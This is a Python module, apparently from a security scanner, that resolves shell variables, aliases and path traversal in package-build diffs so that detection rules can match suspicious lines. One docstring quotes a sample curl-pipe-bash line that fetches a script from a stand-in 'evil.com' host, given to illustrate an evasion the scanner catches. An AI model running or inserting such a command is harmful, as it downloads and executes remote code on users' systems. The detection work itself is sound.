"""Extracted from _tokenizer_engine.py: _apply."""

import re
from ._aliases import _alias_table, _expand_aliases
from ._common import (
    _ASSIGNMENT_RE,
    _MAX_LINE_LEN,
    _VAR_REF_RE,
    _is_diff_header,
    _join_logical,
    _join_side,
    _memoised,
    _split_top_level,
)
from ._quotes import split_lines
from ._variables import (
    _assignments_are_shell,
    _substitute_with_resolve_state,
    _variable_table_with_spans,
)

__all__ = ['_TRAVERSAL_RE', '_joined_indexed', '_resolve_added_lines', '_resolve_removed_lines', 'collapse_traversal', 'resolve_added_lines', 'resolve_removed_lines', 'strip_leading_bom', 'tokenize_and_resolve', 'tokenize_and_resolve_indexed']

_TRAVERSAL_RE = re.compile(r"/(?!\.\./)[^/\s;&|\"']+/\.\.(?=/|$)")

def strip_leading_bom(line: str) -> str:
    """Remove a BOM that opens *line*, keeping any that sits inside it."""
    if line[:1] in ("+", "-", " "):
        marker, body = line[0], line[1:]
        return marker + body.lstrip("\ufeff") if body[:1] == "\ufeff" else line
    return line.lstrip("\ufeff") if line[:1] == "\ufeff" else line

def collapse_traversal(text: str) -> str:
    """Collapse `a/b/../c` to `a/c` in path-shaped tokens."""
    for _ in range(8):
        collapsed = _TRAVERSAL_RE.sub("", text)
        if collapsed == text:
            break
        text = collapsed
    return text

def resolve_added_lines(diff_text: str) -> list[str]:
    """Diff lines with each added line replaced by its resolved form.

    Order and count are preserved, so callers can still map a line back to
    its enclosing function via
    :func:`~trustsight.rules._classify_enclosing_function`.  Rules scoped to
    ``build()`` or ``pkgver()`` need that positional information.

    Substitution is applied per line rather than by zipping against
    :func:`tokenize_and_resolve`, whose output omits assignment lines: any
    added assignment made the two sequences different lengths and shifted
    every following line onto the wrong position.
    """
    return _memoised("resolved", diff_text, lambda: _resolve_added_lines(diff_text))


def resolve_removed_lines(diff_text: str) -> list[str]:
    """Diff lines with each removed line replaced by its resolved form.

    The twin of :func:`resolve_added_lines`: the ``-`` side of a hunk is
    rebuilt with its own variable table, so ``provides=('${pkgbase%-bin}')``
    re-emitted identically resolves to the same names on both sides instead
    of the raw literal failing the package-name filter and dropping out.
    """
    return _memoised(
        "resolved_removed", diff_text,
        lambda: _resolve_removed_lines(diff_text),
    )

def _side_content(
    lines: list[str], marker: str
) -> tuple[list[str], list[int]]:
    """Content lines visible on one side, including unchanged context."""
    content: list[str] = []
    indices: list[int] = []
    for index, raw in enumerate(lines):
        if _is_diff_header(raw):
            continue
        line = strip_leading_bom(raw)
        this_marker = line[0] if line[:1] in ("+", "-") else ""
        if this_marker and this_marker != marker:
            continue
        content.append(line[1:] if this_marker else line)
        indices.append(index)
    return content, indices


def _side_table(
    lines: list[str], marker: str
) -> tuple[dict[str, str], dict[str, list[str]], dict[str, str]]:
    content, indices = _side_content(lines, marker)
    shell_at = _assignments_are_shell(lines)
    shell_lines = [shell_at[index] for index in indices]
    var_table, array_table, _spans = _variable_table_with_spans(
        content, shell_lines=shell_lines
    )
    return var_table, array_table, _alias_table(content)


def _resolve_side_lines(diff_text: str, marker: str) -> list[str]:
    """Diff lines with each *marker*-prefixed line replaced by its resolved
    form (``+`` for additions, ``-`` for removals).

    Order and count are preserved, so callers can still map a line back to
    its enclosing function via
    :func:`~trustsight.rules._classify_enclosing_function`.  Rules scoped to
    ``build()`` or ``pkgver()`` need that positional information.
    """
    lines = split_lines(diff_text)
    var_table, array_table, alias_table = _side_table(lines, marker)
    side_logical = {item[0]: item[1:] for item in _join_side(lines, marker)}
    resolved_lines = []
    for index, line in enumerate(lines):
        if index not in side_logical:
            resolved_lines.append(line)
            continue
        text, quote_before, _quote_after = side_logical[index]
        r, _ok, _after, _quoted = _substitute_with_resolve_state(
            text, var_table, array_table, quote_before,
        )
        r = strip_leading_bom(r)
        r = collapse_traversal(_expand_aliases(r, alias_table))
        if len(r) > _MAX_LINE_LEN:
            r = line[1:] if line[:1] in ("+", "-") else line
        resolved_lines.append(marker + r)
    return resolved_lines


def _resolve_added_lines(diff_text: str) -> list[str]:
    return _resolve_side_lines(diff_text, "+")


def _resolve_removed_lines(diff_text: str) -> list[str]:
    return _resolve_side_lines(diff_text, "-")

def _joined_indexed(lines: list[str]) -> list[tuple[int, str]]:
    """Like :func:`join_line_continuations`, but each logical line is
    paired with the index of the first raw line that produced it.

    ``apply_rules`` needs that index to attach a file/line: the resolved
    candidate list omits assignment lines, so its own positions are not
    the keys of :func:`~trustsight.differ.map_diff_lines`, which are raw
    diff-line indexes.

    Delegates to ``_common._join_logical``, the same implementation
    ``join_line_continuations`` uses, so the two cannot disagree about
    which physical lines the shell runs as one.
    """
    return _join_logical(lines)

def tokenize_and_resolve_indexed(
    diff_text: str,
) -> tuple[list[str], list[str], list[int]]:
    """Tokenize a diff, resolve variable references in added lines, and
    record the raw diff-line index of each resolved string.

    The third list parallels ``resolved``: ``resolved[i]`` came from the
    line at ``split_lines(diff_text)[indices[i]]``.  ``map_diff_lines`` is
    keyed on those raw indexes, so a caller can attach a correct
    file/line to every resolved-rule finding.
    """
    lines = split_lines(diff_text)
    additions = []
    addition_indices = []
    addition_states = []
    for raw_index, text, quote_before, _quote_after in _join_side(lines, "+"):
        content = strip_leading_bom(text)
        if content.strip():
            additions.append(content)
            addition_indices.append(raw_index)
            addition_states.append(quote_before)

    var_table, array_table, alias_table = _side_table(lines, "+")

    # An assignment whose value is statically known contributes its value
    # to the table rather than a command line to match against; anything
    # else is a candidate for resolution.
    shell_at = _assignments_are_shell(lines)

    def _folds_away(line: str) -> bool:
        """True when *line* is nothing but an assignment declaration.

        ``U=evil.com/stage.sh; curl $U | bash`` matches the assignment
        shape, but only up to the first separator: the rest is a second
        command.  Folding such a line hides it from every resolved-target
        rule - R001 included - which is how a curl-pipe-bash chained after
        an assignment went unflagged while the raw-line rules saw only
        their narrow scopes.
        """
        m = _ASSIGNMENT_RE.match(line)
        if not m:
            return False
        value = m.group("value")
        if "$(" in value or "`" in value:
            return False
        return len(_split_top_level(line)) <= 1

    candidates = [
        (addition_indices[k], line, addition_states[k])
        for k, line in enumerate(additions)
        if not (shell_at[addition_indices[k]] and _folds_away(line))
    ]

    resolved = []
    unresolved_out = []
    candidate_indices = []
    for raw_index, line, quote_before in candidates:
        r, ok, _after, quoted = _substitute_with_resolve_state(
            line, var_table, array_table, quote_before,
        )
        # A line that is wholly quoted data is not a command.  Reconstructing
        # it is still useful for H065, but handing it to the command rules
        # would turn ordinary prose inside a multi-line string into a finding.
        if quoted:
            continue
        candidate_indices.append(raw_index)
        expanded = collapse_traversal(_expand_aliases(r, alias_table))
        if len(expanded) > _MAX_LINE_LEN:
            # A6: an expansion past the line bound is left unresolved, never
            # truncated.
            expanded = line
        resolved.append(expanded)
        # "Could not fully resolve" (report-schema.md), not "was literal":
        # a plain `+echo hello` expands to itself and is not unresolved.
        # What belongs here is a failed ${...} expansion (not ok) or a
        # reference that survived substitution ($var nobody declared).
        if not ok or _VAR_REF_RE.search(expanded):
            unresolved_out.append(line)
    return resolved, unresolved_out, candidate_indices

def tokenize_and_resolve(diff_text: str) -> tuple[list[str], list[str]]:
    """Tokenize a diff and resolve variable references in added lines."""
    resolved, unresolved_out, _ = tokenize_and_resolve_indexed(diff_text)
    return resolved, unresolved_out
